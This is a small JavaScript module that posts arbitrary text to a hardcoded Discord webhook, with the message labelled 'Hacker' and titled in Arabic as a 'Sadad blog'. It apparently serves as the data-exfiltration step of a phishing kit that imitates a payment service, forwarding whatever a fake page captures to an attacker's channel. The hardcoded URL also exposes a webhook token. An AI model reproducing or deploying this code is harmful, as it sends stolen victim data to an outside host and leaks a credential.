import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323968360064614430/Zp3drqZ7G4924IlzEcYIMRuxpBSlqS-v-z8wg-WOMfzxXlp0R2hcc_Jz09JkE9toJBqR",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
